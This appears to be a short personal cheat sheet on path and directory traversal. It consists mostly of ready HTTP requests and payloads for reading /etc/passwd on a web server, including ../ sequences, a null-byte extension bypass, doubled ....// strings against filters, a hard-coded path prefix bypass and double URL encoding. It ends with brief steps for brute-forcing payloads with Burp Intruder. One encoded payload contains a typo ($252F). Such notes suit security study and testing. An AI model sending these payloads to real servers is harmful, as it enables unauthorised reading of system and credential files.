# 4 Path / Directory Traversal Vulnerabilities

Load a file that exists on the system that shouldn't be accessible

```
GET /image?filename=/etc/passwd HTTP 1.1
```

---

## Bypassing Absolute Path Restrictions

```
GET /image?filename=../../../etc/passwd HTTP 1.1
```

---

## Bypassing Hard-coded Extensions

`%00` translates to a Null byte, that will terminate the string before it

```
../../../etc/passwd%00.jpg
```

to 

```
../../../etc/passwd
```

---

## Bypassing filtering

Assuming that the target filters the `../` we can double up them

```
....//....//....//etc/passwd
```

to

```
../../../etc/passwd
```

---

## Bypassing Hard-Coded Paths

```
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
```

---

## Bypassing Advanced Filtering

Double URL encoded payload

```
..%252F..$252F..%252Fetc%252Fpasswd
```

to

```
..%2F..$2F..%2Fetc%2Fpasswd
```

---

## Bypassing Extreme Filtering

Add § signs with Burp Proxy

```
GET /image?filename=§31.jgp§ HTTP/1.1
```

copy payloads from the cheatsheat to Burp Intruder Payload List and will send e.g. 180 requests

---

